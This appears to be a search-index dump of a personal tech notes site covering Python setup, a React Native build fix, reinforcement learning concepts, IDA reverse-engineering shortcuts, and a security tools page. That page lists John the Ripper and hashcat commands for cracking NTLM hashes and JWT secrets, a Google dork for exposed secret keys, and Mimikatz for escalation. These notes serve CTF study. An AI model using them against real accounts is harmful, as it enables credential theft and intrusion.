Shared Python runtime library (version 3.10) ii libpython3.10-dev:amd64 3.10.4-3 amd64 Header files and a static library for Python (v3.10) ii libpython3.10-minimal:amd64 3.10.4-3 amd64 Minimal subset of the Python language (version 3.10) ii libpython3.10-stdlib:amd64 3.10.4-3 amd64 Interactive high-level object-oriented language (standard library, version 3.10) ii libpython3.8:amd64 3.8.17-1+jammy1 amd64 Shared Python runtime library (version 3.8) ii libpython3.8-dev:amd64 3.8.17-1+jammy1 amd64 Header files and a static library for Python (v3.8) ii libpython3.8-minimal:amd64 3.8.17-1+jammy1 amd64 Minimal subset of the Python language (version 3.8) ii libpython3.8-stdlib:amd64 3.8.17-1+jammy1 amd64 Interactive high-level object-oriented language (standard library, version 3.8) ii python-apt-common 2.3.0ubuntu2 all Python interface to libapt-pkg (locales) rc python-matplotlib-data 3.1.2-1ubuntu4 all Python based plotting system (data package) ii python-pip-whl 20.0.2-5ubuntu1.9 all Python package installer ii python3 3.10.4-0ubuntu2 amd64 interactive high-level object-oriented language (default python3 version) ii python3-apt 2.3.0ubuntu2 amd64 Python 3 interface to libapt-pkg ii python3-dev 3.10.4-0ubuntu2 amd64 header files and a static library for Python (default) ii python3-distutils 3.10.4-0ubuntu1 all distutils package for Python 3.x ii python3-lib2to3 3.10.4-0ubuntu1 all Interactive high-level object-oriented language (lib2to3) ii python3-minimal 3.10.4-0ubuntu2 amd64 minimal subset of the Python language (default python3 version) ii python3-pip 20.0.2-5ubuntu1.9 all Python package installer ii python3-pkg-resources 59.6.0-1.2 all Package Discovery and Resource Access using pkg_resources ii python3-setuptools 59.6.0-1.2 all Python3 Distutils Enhancements ii python3-wheel 0.34.2-1ubuntu0.1 all built-package format for Python ii python3.10 3.10.4-3 amd64 Interactive high-level object-oriented language (version 3.10) ii python3.10-dev 3.10.4-3 amd64 Header files and a static library for Python (v3.10) ii python3.10-minimal 3.10.4-3 amd64 Minimal subset of the Python language (version 3.10) ii python3.8 3.8.17-1+jammy1 amd64 Interactive high-level object-oriented language (version 3.8) ii python3.8-dev 3.8.17-1+jammy1 amd64 Header files and a static library for Python (v3.8) ii python3.8-minimal 3.8.17-1+jammy1 amd64 Minimal subset of the Python language (version 3.8) rc python3.8-venv 3.8.17-1+jammy1 amd64 Interactive high-level object-oriented language (pyvenv binary, version 3.8) $ gdb GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90 Copyright (C) 2022 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \u0026#34;show copying\u0026#34; and \u0026#34;show warranty\u0026#34; for details. This GDB was configured as \u0026#34;x86_64-linux-gnu\u0026#34;. Type \u0026#34;show configuration\u0026#34; for configuration details. For bug reporting instructions, please see: \u0026lt;https://www.gnu.org/software/gdb/bugs/\u0026gt;. Find the GDB manual and other documentation resources online at: \u0026lt;http://www.gnu.org/software/gdb/documentation/\u0026gt;. For help, type \u0026#34;help\u0026#34;. Type \u0026#34;apropos word\u0026#34; to search for commands related to \u0026#34;word\u0026#34;... pwndbg: loaded 146 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list. pwndbg: created $rebase, $ida GDB functions (can be used with print/break) Reading symbols from chal... (No debugging symbols found in chal) ------- tip of the day (disable with set show-tips off) ------- Pwndbg context displays where the program branches to thanks to emulating few instructions into the future. You can disable this with set emulate off which may also speed up debugging pwndbg\u0026gt; :::\nReference # Installing multiple alternative versions of Python on Ubuntu 20.04\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nuninstall_python3\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":349,"href":"/problem-solutions/react-native---error-resolving-plugin-id_-com.facebook.react.settings/","title":"React Native - Error resolving plugin [id: 'com.facebook.react.settings']","section":"Problem Solutions","content":" React Native - Error resolving plugin [id: \u0026lsquo;com.facebook.react.settings\u0026rsquo;] # Problem Statement # 這個錯誤是發生在我想要創建一個新的React Native專案，但不管是用Official Document還是其他網路文章的分享，我都無法順利創建，確切的錯誤message如下\n$ yarn android yarn run v1.22.22 $ react-native run-android (node:13044) [DEP0040] DeprecationWarning: The `punycode` module is deprecated. Please use a userland alternative instead. (Use `node --trace-deprecation ...` to show where the warning was created) info A dev server is already running for this project on port 8081. info Installing the app... info 💡 Tip: Make sure that you have set up your development environment correctly, by running npx react-native doctor. To read more about doctor command visit: https://github.com/react-native-community/cli/blob/main/packages/cli-doctor/README.md#doctor FAILURE: Build failed with an exception. * Where: Settings file \u0026#39;D:\\Downloads\\Trash\\MyProject\\android\\settings.gradle\u0026#39; line: 2 * What went wrong: Error resolving plugin [id: \u0026#39;com.facebook.react.settings\u0026#39;] \u0026gt; java.io.UncheckedIOException: Could not move temporary workspace (D:\\Downloads\\Trash\\MyProject\\android\\.gradle\\8.8\\dependencies-accessors\\569c8b261a8a714d7731d5f568e0e5c05babae10-3763ef7e-e78a-4639-821b-3aa92091847a) to immutable location (D:\\Downloads\\Trash\\MyProject\\android\\.gradle\\8.8\\dependencies-accessors\\569c8b261a8a714d7731d5f568e0e5c05babae10) 我是按照官方的文檔進行創建，而錯誤是發生在gradle的setting file中發生問題(MyProject\\android\\settings.gradle)，具體來說應該是版本上的問題，有嘗試針對以下文章說明的解決方式試看看，但都一無所獲\nhttps://stackoverflow.com/questions/78384724/react-native-error-java-io-uncheckedioexception-could-not-move-temporary-work https://github.com/facebook/react-native/issues/46210 https://github.com/facebook/react-native/issues/46133 Before Solution # 請先確定不是其他問題造成的，也就是盡量以官方說明的操作為優先，如果都沒問題，可以先用$ npx react-native doctor看看有沒有其他的環境變數或是emulator或是sdk沒有裝，如果發現問題，系統會告訴你(必需要在自己的project內執行該command)\nSolution # 目前可行的方式是降版本，我一開始所用的React Native版本是0.76，但實際上應該要用0.74.5，然後更改setting.gradle的第3行的gradle version成8.5版本就可以了，原本的版本應該會是8.6\n$ npx @react-native-community/cli init ProjectName --version=0.74.5 # Modify ./android/gradle/wrapper/gradle-wrapper.properties # --\u0026gt; distributionUrl=https\\://services.gradle.org/distributions/gradle-8.5-all.zip "},{"id":350,"href":"/tools/others/real-world-tools/","title":"Real World Tools","section":"Tools","content":" Real World Tools # Kali-Linux # 有關Kali的所有工具可以直接參考Operating Systems for Ethical Hackers - A Platform Comparison of Kali Linux and Parrot OS :::info ul Hassan, S. Z., Muzaffar, Z., \u0026amp; Ahmad, S. Z. (2021). Operating Systems for Ethical Hackers-A Platform Comparison of Kali Linux and Parrot OS. International Journal, 10(3). ::: 裡面有詳細分類\nInformation Gathering Tools(67) Vulnerability Analysis Tools(27) Exploitation Tools(21) Wireless Attacks Tools(54) Forensics Tools(23) Web Applications tools(43) Stress Testing tools(14) Sniffing \u0026amp; Spoofing Tools(33) Password Attacks Tools(39) Maintaining Access Tools(17) Reverse Engineering Tools(11) Reporting Tools(10) Hardware Hacking(6) Some Parrot OS in-built tools(20) Recon # Google Hacking :::spoiler Description\nSyntax Description Example + 連接多個關鍵字 \u0026ndash; - 忽略關鍵字 \u0026ndash; .. 範圍 \u0026ndash; * 萬用字元 \u0026ndash; '' 精準查詢，一定要符合關鍵字 index of intext 搜尋網頁內容，列出符合關鍵字的網頁 intext:SECRET_KEY intitle 搜尋網頁中的標題 intitle:index of define 搜尋關鍵字的定義 define:hacker filetype 搜尋指定類型的文件 filetype:pdf info 搜尋指定網站的基本資訊 info:www.fcu.edu.tw related 搜尋類似於指定網站的其他網站 related:www.fcu.edu.tw inurl 尋找指定的字串是否在網址列當中 inurl:www.fcu.edu.tw site 搜尋指定網址的內容 site:www.fcu.edu.tw ::: Shodan / Censys :::spoiler Description :::\nDictionary Brute Force # John The Ripper # NTLM $ ./run/john.exe {pwn file} --wordlist={dictionary path} --format={NT...} # JWT $ john jwt.txt --wordlist={e.g. /usr/share/wordlists/rockyou.txt} --format={jwt alg, e.g. HMAC-SHA256} Rockyou.txt Online Tool 1 Online Tool 2 hashcat: # NTLM $ hashcat -a 0 -m 1000 {ntlm.hash} {rockyou.txt} --force # JWT $ hashcat -a 3 -m 16500 {jwt.txt} {secrets format, e.g. ?a?a?a?a} Escalation # For Windows: Mimikatz Overall # Mitre ATT\u0026amp;CK 如果要查常用指令怎麼下，可以找tldr Inspect # Virus Total Alien Vault IBM X-Force Any.Run: Online Sandbox OSINT # sherlock $ git clone https://github.com/sherlock-project/sherlock.git $ cd sherlock $ conda create --name sherlock python=3.10 -y $ pip install -r requirements.txt $ python sherlock/sherlock.py {username} Image Search Google Map OSINT Framework Phone Whois or ipwhoisinfo Whatsmyname - online tool DNS Lookup(從Domain Name看IP) 如果要查看手機本身的Network IP(不是wifi)，可以看 https://ipinfo.io "},{"id":351,"href":"/terminology/reinforcement-learning/","title":"Reinforcement Learning","section":"Terminologies","content":" Reinforcement Learning # 什麼是RL # Reinforcement Learning（強化學習）是一種機器學習方法，通過試錯和獎勵機制來學習最佳行為。以下是強化學習的幾個應用面向，以及一些相關論文的參考： 遊戲：強化學習在遊戲領域中取得了顯著成就，例如AlphaGo和AlphaZero等。 機器人控制：用於控制機器人完成複雜任務，如行走、抓取物體等。 股票預測：應用於股票交易、投資策略等金融領域。 交通：用於優化交通信號控制、路線規劃等。\n基本概念 # 強化學習（Reinforcement Learning）是一種機器學習方法，通過試錯和獎勵機制來學習最佳行為:\n代理（Agent）：在環境中採取行動的實體，可以是機器人、軟件程序等。 環境（Environment）：代理所處的外部世界，提供狀態和反饋給代理。 狀態（State）：環境在某一時刻的描述，通常用$s$ 表示。 行動（Action）：代理在環境中採取的動作，通常用$a$ 表示。 獎勵（Reward）：環境對代理行動的反饋，用於引導學習，通常用$r$ 表示。 策略（Policy）：代理根據狀態選擇行動的方法，通常用$\\pi(a|s)$ 表示。 價值函數（Value Function）：評估在某一狀態下遵循特定策略的預期累積獎勵，用於評估狀態的好壞。 Q函數（Q-Function）：評估在某一狀態下採取特定行動後遵循特定策略的預期累積獎勵。 基本過程 # 初始化：代理開始與環境交互。 觀察狀態：代理觀察環境的當前狀態。 選擇行動：根據策略選擇行動。 執行動作：在環境中執行動作。 獲得獎勵：環境給予獎勵。 更新知識：更新價值函數或Q函數，以改善未來的決策。 常見算法 # Q-learning：使用Q函數學習最佳行動。 SARSA：使用價值函數學習最佳行動。 Deep Q-Networks (DQN)：使用深度神經網絡來近似Q函數。 Policy Gradient Methods：直接學習策略而非價值函數。 Value Function VS Q-Function # 在強化學習（Reinforcement Learning, RL）中，Value Function（價值函數） 和 Q-Function（Q 值函數） 都是用來評估策略 $\\pi$ 的好壞，但它們的側重點不同。\n函數 定義 描述 State Value Function（狀態價值函數）$V(s)$ $V^\\pi(s) = \\mathbb{E} \\left[ \\sum_{t=0}^{\\infty} \\gamma^t R_t \\mid S_0 = s, \\pi \\right]$ 表示 在狀態 $s$ 下，根據策略 $\\pi$ 所能期望獲得的累積回報。 Action-Value Function（行動價值函數）$Q(s, a)$ $Q^\\pi(s, a) = \\mathbb{E} \\left[ \\sum_{t=0}^{\\infty} \\gamma^t R_t \\mid S_0 = s, A_0 = a, \\pi \\right]$ 表示 在狀態 $s$ 下執行動作 $a$，並按照策略 $\\pi$ 行動後，所能期望獲得的累積回報。 Value Function $$ V^\\pi(s) = \\mathbb{E}\\pi \\left[ \\sum{t=0}^\\infty \\gamma^t r_t \\mid s_0 = s \\right] $$\n其中：\n$\\mathbb{E}_\\pi$ 表示在策略$\\pi$下取期望。 $r_t$ 是在時間步$t$獲得的獎勵。 $\\gamma$ 是折扣因子，控制未來獎勵的重要性。 $s_0 = s$ 表示初始狀態為$s$。 Q-Function $$ Q^\\pi(s, a) = \\mathbb{E}_\\pi \\left[ r + \\gamma V^\\pi(s\u0026rsquo;) \\mid s, a \\right] $$\n或更一般地：\n$$ Q^\\pi(s, a) = \\mathbb{E}\\pi \\left[ \\sum{t=0}^\\infty \\gamma^t r_t \\mid s_0 = s, a_0 = a \\right] $$\n其中：\n$s\u0026rsquo;$ 是採取行動$a$後的下一狀態。 其他符號與價值函數的表達式中相同。 在Q-learning等算法中，Q函數通常使用以下更新規則來學習：\n$$ Q(s, a) \\leftarrow Q(s, a) + \\alpha \\left[ r + \\gamma \\max_{a\u0026rsquo;} Q(s\u0026rsquo;, a\u0026rsquo;) - Q(s, a) \\right] $$\n其中：\n$\\alpha$ 是學習率。 $\\max_{a\u0026rsquo;} Q(s\u0026rsquo;, a\u0026rsquo;)$ 是下一狀態中所有可能行動的最大Q值。 $V(s)$ 只考慮當前狀態的價值，適合評估當前策略的整體表現。 $Q(s, a)$ 則考慮特定動作的價值，適合用於決策選擇最佳動作（policy improvement）。 舉例：自駕車停車 # 假設我們在訓練一輛 自動駕駛車 停進停車位的策略。\n1. 狀態價值函數 $V(s)$ # 假設 狀態 $s$ 表示車輛目前的位置，我們有：\n$V(s_1) = 0.8$ 代表在停車場入口時，預計可以獲得 0.8 的回報（可能是停好車的成功率）。 $V(s_2) = 0.9$ 代表在更接近停車位的位置時，回報變高。 這表示 越接近停車位的狀態，價值越高，但這裡沒有考慮具體的行動選擇。\n2. Q 值函數 $Q(s, a)$ # 假設 動作 $a$ 包括：\n$a_1$ = 前進（move forward） $a_2$ = 左轉（turn left） $a_3$ = 右轉（turn right） 我們可以有：\n$Q(s_1, a_1) = 0.6$（在入口時，選擇前進的預期回報是 0.6） $Q(s_1, a_2) = 0.2$（在入口時，直接左轉可能導致撞牆，所以回報較低） $Q(s_2, a_1) = 0.9$（更接近停車位時選擇前進，回報較高） 這表示 Q 值函數不僅考慮當前狀態，還考慮具體的行動對未來回報的影響。\n總結 # $V(s)$ 只告訴我們當前狀態好不好，但不告訴我們該做什麼動作。 $Q(s, a)$ 告訴我們在當前狀態 $s$ 下，選擇不同動作 $a$ 的好壞，可以用來決策選擇最好的動作（如 Q-Learning）。 🚗 自駕車例子：\n$V(s)$ 只是說「這個位置靠近停車位，所以好」，但 不告訴我們該轉向還是前進。 $Q(s, a)$ 具體說明「這裡左轉不好，前進較好」，幫助我們選擇最佳動作。 在 Q-Learning 和 Deep Q-Networks（DQN） 等方法中，主要學習 $Q(s, a)$，然後選擇最大 Q 值的動作來更新策略。\nOn-Policy VS Off-Policy # 在強化學習（Reinforcement Learning, RL）中，On-Policy 和 Off-Policy 的區別主要在於學習時使用的策略（policy）與執行時的策略是否相同。\n如果用一句話概括：\nOn-Policy（內部策略學習）：學習與執行同一個策略。 Off-Policy（外部策略學習）：學習時使用與執行不同的策略。 1. On-Policy（內部策略學習） # 定義 # 在收集數據時，使用的策略（行動選擇）與學習時的策略相同。 也就是說，演算法只能學習當前策略 $\\pi$，並依賴 $\\pi$ 產生的經驗來改進自身。 代表性演算法 # SARSA（State-Action-Reward-State-Action） 依據當前策略 $\\pi$ 來選擇動作並更新 Q 值。 例如，如果使用 $\\epsilon$-貪婪策略（$\\epsilon$-greedy），則學習的 Q 值也會考慮這種策略下的行動。 特點 # ✅ 適合策略改進（policy improvement），因為它直接學習當前策略的行為。 ✅ 收斂性較穩定，因為學到的價值估計與執行行為相匹配。 ❌ 探索能力有限，因為只能學習自己當前策略的數據，難以學習更好的行動。\n2. Off-Policy（外部策略學習） # 定義 # 學習時的策略與執行時的策略不同，即可以用不同的策略來收集數據，然後用這些數據來學習更好的策略。 這允許模型透過試探性策略（exploration policy） 來收集數據，但學習一個更優的目標策略（target policy）。 代表性演算法 # Q-Learning\n無論探索時是否選擇了最佳動作，更新 Q 值時都假設每個狀態都會選擇最優動作（max Q），這使得它可以學習最優策略。 Deep Q-Networks（DQN）\n使用 經驗回放（experience replay），存儲過去的數據並從中抽樣來訓練 Q 網絡，使得學習與數據收集分離，這本質上是一種 Off-Policy 方法。 特點 # ✅ 探索能力更強，因為可以使用不同的策略來收集更多多樣的數據。 ✅ 可以利用過去經驗數據，例如 DQN 的經驗回放（experience replay）。 ❌ 收斂可能不穩定，因為學習的策略與數據來源可能不匹配。\n3. 直觀舉例 # 例子 1：自駕車 # 假設你在訓練自動駕駛車輛，你的目標是讓車學習到最安全的駕駛方式：\nOn-Policy（SARSA）：\n車輛根據當前駕駛策略行駛，然後學習基於這種駕駛風格的價值函數。例如，如果車輛偶爾違規變道，學習到的策略仍然會保留這種行為。 缺點是如果當前策略不夠優秀，學到的內容可能也不夠優秀。 Off-Policy（Q-Learning）：\n你讓不同車輛嘗試各種駕駛風格（包括安全駕駛和激進駕駛），然後學習最安全的駕駛策略。 這樣，即使有些車輛的行為不理想，演算法仍能學習到更好的策略。 例子 2：小朋友學騎腳踏車 # On-Policy（SARSA）：\n小朋友根據自己當前的學習方式練習，例如只嘗試自己能做的動作，然後根據這些嘗試來調整策略。 如果他害怕摔倒，不會嘗試太多冒險的動作，因此學習速度可能較慢。 Off-Policy（Q-Learning）：\n小朋友可以看別人騎腳踏車，學習到最好的技巧，然後用來改善自己的策略。 這樣，即使自己還沒嘗試某些行動，也可以學習到這些行為的價值。 4. 總結：On-Policy vs. Off-Policy # 比較項目 On-Policy（內部策略） Off-Policy（外部策略） 學習策略 只能學習自身策略的數據 可以從不同策略的數據中學習 探索能力 受限於當前策略的行為 可以透過不同策略收集更多數據 代表演算法 SARSA, REINFORCE Q-Learning, DQN 應用場景 策略梯度（Policy Gradient）、安全性較高的應用 需要長期探索、大量數據的應用 穩定性 通常比較穩定 可能會收斂較慢或不穩定 結論：\nOn-Policy（如 SARSA）適合需要安全性與穩定性的學習場景，但可能學不到最優策略。 Off-Policy（如 Q-Learning）可以利用更多數據來學習更好的策略，但可能會不穩定或過度偏向最大 Q 值的選擇。 如果你想讓模型學到最好的策略（最優解），通常會選擇 Off-Policy（如 Q-Learning）。如果你想要學習穩定且不會意外做出危險決策的策略，則會選擇 On-Policy（如 SARSA）。\nWhat is SARSA \u0026amp; Q-Learning # :::info 詳細數學推導可以參考: 深度強化學習 Ch3.1 : TD learning ::: SARSA（State-Action-Reward-State-Action） 和 Q-Learning 都是強化學習（Reinforcement Learning, RL）中的值基方法（Value-Based Methods），它們的主要目標是學習動作-價值函數（Q-Function），以選擇最佳動作來最大化累積回報。\n它們的核心區別在於策略選擇方式：\nSARSA 是 On-Policy（內部策略學習），學習當前策略的行為。 Q-Learning 是 Off-Policy（外部策略學習），學習最優策略，即使數據來自不同的行為策略。 1. SARSA（On-Policy） # 核心概念 # SARSA 是On-Policy 強化學習方法，意味著它學習的是當前正在執行的策略（policy），即它的 Q 值更新是基於實際選擇的動作，而不是理論上的最優動作。\n更新公式 # $$ Q(s_t, a_t) \\leftarrow Q(s_t, a_t) + \\alpha \\left[ r_t + \\gamma Q(s_{t+1}, a_{t+1}) - Q(s_t, a_t) \\right] $$ 其中：\n$s_t, a_t, r_t$：當前狀態、動作和獎勵。 $s_{t+1}, a_{t+1}$：下一個狀態及根據當前策略選擇的下一個動作。 $\\alpha$（學習率）：控制更新步伐。 $\\gamma$（折扣因子）：決定未來回報的重要性。 SARSA 的特點 # ✅ 學習當前策略的行為，不會過於激進地選擇最優解，較穩定。 ✅ 策略與學習方式一致，不會突然變成極端的貪婪策略，適合安全性要求高的環境。 ❌ 可能學不到最優策略，如果策略不是最優的，那學習結果也可能不是最優的。\n舉例 # 🛵 例子：學騎腳踏車\n小朋友用 SARSA 來學習騎腳踏車，他會根據自己的學習風格來選擇動作（如小心慢騎）。 當他遇到坑洞時，他會根據自己當前的策略決定是慢慢避開還是稍微加速躲開。 這代表他學習的是一種「安全但可能不是最快的騎車方式」。 2. Q-Learning（Off-Policy） # 核心概念 # Q-Learning 是Off-Policy 強化學習方法，這意味著它學習的是最優策略，而不管數據來自哪種策略。\n即使當前的行為策略（例如隨機選擇動作）不是最優的，Q-Learning 依然會學習最優的行動選擇方式。 更新公式 # $$ Q(s_t, a_t) \\leftarrow Q(s_t, a_t) + \\alpha \\left[ r_t + \\gamma \\max_{a} Q(s_{t+1}, a) - Q(s_t, a_t) \\right] $$ 與 SARSA 唯一的區別是：\nSARSA 用的是「實際選擇的下一個動作」$Q(s_{t+1}, a_{t+1})$。 Q-Learning 直接選擇「下一個狀態的最優動作」$\\max_{a} Q(s_{t+1}, a)$ 來更新 Q 值。 Q-Learning 的特點 # ✅ 能學到最優策略，因為它總是選擇最好的 Q 值來學習。 ✅ 可以利用 Off-Policy 數據，例如過去的經驗來更新學習結果（像 DQN 的經驗回放）。 ❌ 可能學習不穩定，如果環境變化大，它可能會過度偏向最優動作而忽略探索。\n舉例 # 🚗 例子：自駕車找停車位\n假設 Q-Learning 訓練一輛自動駕駛車來找停車位。 雖然車輛一開始可能亂選路線，但最終它會學到「最短最快的停車路線」。 即使一開始的數據來自於人類駕駛或隨機行為，Q-Learning 仍然會學習出最優的停車策略。 3. SARSA vs. Q-Learning（比較） # 比較項目 SARSA（On-Policy） Q-Learning（Off-Policy） 學習策略 學習當前執行的策略 學習最優策略 更新方式 依據實際選擇的行動更新 依據最大 Q 值更新 穩定性 收斂較穩定，但不一定最優 可能不穩定，但學習結果更好 探索能力 受限於當前策略的行為 可以從不同策略的數據中學習 代表性應用 需要安全性高的應用，如醫療機器人 需要找到最優解的應用，如自駕車 適用場景 策略梯度、保守決策環境 需要大量探索、目標最優化的環境 核心區別 # SARSA 是 On-Policy，學習的是「當前策略」，適合安全性較高的情境（如自駕車減速避讓行人）。 Q-Learning 是 Off-Policy，學習的是「最優策略」，適合追求最優解的環境（如最快找到停車位）。 4. 何時用 SARSA？何時用 Q-Learning？ # ✅ SARSA（On-Policy）適用情境\n需要安全性較高的場景，例如： 醫療機器人（避免風險操作） 自駕車避障（減少風險行為） 教育 AI（確保不過於極端行為） 主要用於「學習當前策略的行為」。 ✅ Q-Learning（Off-Policy）適用情境\n需要找到全局最優解，例如： 遊戲 AI（學到最佳策略） 自駕車尋找最佳路徑（找最短停車路線） 金融交易策略（學到最賺錢的投資方式） 主要用於「學習最優策略，而不管數據來源」。 5. 總結 # SARSA：On-Policy，學當前策略，較安全但可能不是最優解。 Q-Learning：Off-Policy，學最優策略，探索能力強但可能學習不穩定。 如果你希望 AI 探索最優解，選 Q-Learning；如果你希望 AI 行為穩定，選 SARSA。 "},{"id":352,"href":"/tools/ctf/reverse-overview/","title":"Reverse Overview","section":"Tools","content":" Reverse Overview # Tools # Type App .NET x86/x64 Packer Python C General Description MobSF: Must run in python 3.8ApkTool: Just follow the step in install guide To decompile C#(.NET) 指令：$ upx -d {filename} 一個可以把組語轉換成c pseudo code的線上工具 一個線上的decompiler，結合多種工具，只要上傳檔案(小於2MB)就可以呈現多種decompiler tools的結果 Link MobSFApkTools dnSpy x86模擬器x86/x64 assembler/disassembler UPX Packer Pyc disassemble Compiler Explorer Decompiler Explorer IDA 常用快捷鍵 # IDA Interface 型別 char(1 byte) WORD(2 bytes) DWORD(4 bytes) PDWORD(pointer of DWORD = DWORD *) 若是DWORD *name，代表name這個變數是一個pointer而且指向的地方是一個DWORD Space: 在 Text View / Graph View 切換 Tab: 在視窗之間切換 ;/Insert: 註解 x: 秀出 Xrefs n: 改名 y: 改型別 h: 改表示方式 (dec / hex) u: 取消定義 a: 當成字串 c: 當成code p: 當成function t: set sizeof(XXX)；如果已經確定目前的constant就是某個變數的length，那可以直接按t讓他變成sizeof(那個變數) 舉例：如果已經確定目前的0x238就是PROCESSENTRY32W的size，就可以直接這樣用，會變得比較清楚 :::spoiler 結果 ::: Shift+F1: show出Local Type視窗 :::spoiler Local Types Screenshot ::: Shift+F12: 開啟Strings視窗 :::spoiler Strings Screenshot ::: 對某一個數值按m: ENUM這個功能就是在替換一些常見的windows API參數，讓原本的純數字可以用文字表示，這樣比較好懂API的操作，逆向會更順暢(補充說明：IDA有收錄很多MSDN上的一些API，他每一個參數表示的文字，例如這一篇底下有顯示很多Constant/value的對應，而正常情況下IDA會顯示的是value，如果要把它換成Constant文字的表達式就可以用到ENUM這個功能)，又例如: 目前已經知道CreateToolhelp32Snapshot(2, 0);中的2的意義是TH32CS_SNAPPROCESS(可以參考MSDN)，此時就可以直接按m之後再選擇TH32CS_SNAPPROCESS :::spoiler ::: \\: 不顯示/顯示資料型別 Alt+M/Ctrl+M: 前者是註冊書籤，後者是察看並選擇標籤，可以快速跑到標示的地址 Ctrl+E: 如果是分析DLL file，可能會有很多不同的entry point，利用這個shortcut可以顯示目前有幾個entry point，很方便 :::spoiler ::: 如何把bytes變成字串: 可以直接Alt+A :::spoiler 可以先把bytes的型別定義好(單獨的bytes變成array)，變成array有兩種方法，第一種是直接用Y定義他的型別成int dword_2008[32]，前面的int就看每一個字元是來決定，後面[32]就代表有多少字元變成array；第二種方法就是直接按d改變一個字元的型態變成int，然後在edit/Array的地方可以叫出Convert to array的視窗(如果前面沒有先用d改變型態的話，他會以為所有字元都是一個byte，然後總共有128個字元這樣換算，但其實我們是總共32個字元，每一個字元是4個bytes，也就是int，這一點要特別注意) 接著就是在Option/String literals視窗中設定用哪一個型態表示字串，這邊因為每一個字元都是4 bytes，也就是32 bits，所以選擇C-style ::: :::spoiler 完整流程 .rodata:0000000000002008 unk_2008 db 46h ; F ; DATA XREF: main+8↑o .rodata:0000000000002009 db 0 .rodata:000000000000200A db 0 .rodata:000000000000200B db 0 .rodata:000000000000200C db 4Ch ; L .rodata:000000000000200D db 0 .rodata:000000000000200E db 0 .rodata:000000000000200F db 0 .rodata:0000000000002010 db 41h ; A .rodata:0000000000002011 db 0 .rodata:0000000000002012 db 0 .rodata:0000000000002013 db 0 .rodata:0000000000002014 db 47h ; G .rodata:0000000000002015 db 0 .rodata:0000000000002016 db 0 .rodata:0000000000002017 db 0 .rodata:0000000000002018 db 7Bh ; { .rodata:0000000000002019 db 0 .rodata:000000000000201A db 0 .rodata:000000000000201B db 0 .rodata:000000000000201C db 68h ; h .rodata:000000000000201D db 0 .rodata:000000000000201E db 0 .rodata:000000000000201F db 0 .rodata:0000000000002020 db 33h ; 3 .rodata:0000000000002021 db 0 .rodata:0000000000002022 db 0 .rodata:0000000000002023 db 0 .rodata:0000000000002024 db 31h ; 1 .rodata:0000000000002025 db 0 .rodata:0000000000002026 db 0 .rodata:0000000000002027 db 0 .rodata:0000000000002028 db 31h ; 1 .rodata:0000000000002029 db 0 .rodata:000000000000202A db 0 .rodata:000000000000202B db 0 .rodata:000000000000202C db 4Fh ; O .rodata:000000000000202D db 0 .rodata:000000000000202E db 0 .rodata:000000000000202F db 0 .rodata:0000000000002030 db 5Fh ; _ .rodata:0000000000002031 db 0 .rodata:0000000000002032 db 0 .rodata:0000000000002033 db 0 .rodata:0000000000002034 db 72h ; r .rodata:0000000000002035 db 0 .rodata:0000000000002036 db 0 .rodata:0000000000002037 db 0 .rodata:0000000000002038 db 65h ; e .rodata:0000000000002039 db 0 .rodata:000000000000203A db 0 .rodata:000000000000203B db 0 .rodata:000000000000203C db 76h ; v .rodata:000000000000203D db 0 .rodata:000000000000203E db 0 .rodata:000000000000203F db 0 .rodata:0000000000002040 db 65h ; e .rodata:0000000000002041 db 0 .rodata:0000000000002042 db 0 .rodata:0000000000002043 db 0 .rodata:0000000000002044 db 72h ; r .rodata:0000000000002045 db 0 .rodata:0000000000002046 db 0 .rodata:0000000000002047 db 0 .rodata:0000000000002048 db 73h ; s .rodata:0000000000002049 db 0 .rodata:000000000000204A db 0 .rodata:000000000000204B db 0 .rodata:000000000000204C db 31h ; 1 .rodata:000000000000204D db 0 .rodata:000000000000204E db 0 .rodata:000000000000204F db 0 .rodata:0000000000002050 db 6Eh ; n .rodata:0000000000002051 db 0 .rodata:0000000000002052 db 0 .rodata:0000000000002053 db 0 .rodata:0000000000002054 db 67h ; g .rodata:0000000000002055 db 0 .rodata:0000000000002056 db 0 .rodata:0000000000002057 db 0 .rodata:0000000000002058 db 5Fh ; _ .rodata:0000000000002059 db 0 .rodata:000000000000205A db 0 .rodata:000000000000205B db 0 .rodata:000000000000205C db 33h ; 3 .rodata:000000000000205D db 0 .rodata:000000000000205E db 0 .rodata:000000000000205F db 0 .rodata:0000000000002060 db 6Eh ; n .rodata:0000000000002061 db 0 .rodata:0000000000002062 db 0 .rodata:0000000000002063 db 0 .rodata:0000000000002064 db 67h ; g .rodata:0000000000002065 db 0 .rodata:0000000000002066 db 0 .rodata:0000000000002067 db 0 .rodata:0000000000002068 db 69h ; i .rodata:0000000000002069 db 0 .rodata:000000000000206A db 0 .rodata:000000000000206B db 0 .rodata:000000000000206C db 6Eh ; n .rodata:000000000000206D db 0 .rodata:000000000000206E db 0 .rodata:000000000000206F db 0 .rodata:0000000000002070 db 65h ; e .rodata:0000000000002071 db 0 .rodata:0000000000002072 db 0 .rodata:0000000000002073 db 0 .rodata:0000000000002074 db 65h ; e .rodata:0000000000002075 db 0 .rodata:0000000000002076 db 0 .rodata:0000000000002077 db 0 .rodata:0000000000002078 db 72h ; r .rodata:0000000000002079 db 0 .rodata:000000000000207A db 0 .rodata:000000000000207B db 0 .rodata:000000000000207C db 35h ; 5 .rodata:000000000000207D db 0 .rodata:000000000000207E db 0 .rodata:000000000000207F db 0 .rodata:0000000000002080 db 7Dh ; } .rodata:0000000000002081 db 0 .rodata:0000000000002082 db 0 .rodata:0000000000002083 db 0 .rodata:0000000000002084 db 0 .rodata:0000000000002085 db 0 .rodata:0000000000002086 db 0 .rodata:0000000000002087 db 0 $\\downarrow$ .rodata:0000000000002008 dword_2008 dd 46h, 4Ch, 41h, 47h, 7Bh, 68h, 33h, 2 dup(31h), 4Fh, 5Fh, 72h, 65h, 76h, 65h, 72h, 73h, 31h, 6Eh, 67h .rodata:0000000000002008 ; DATA XREF: main+8↑o .rodata:0000000000002008 dd 5Fh, 33h, 6Eh, 67h, 69h, 6Eh, 2 dup(65h), 72h, 35h, 7Dh, 0 $\\downarrow$ .rodata:0000000000002008 text 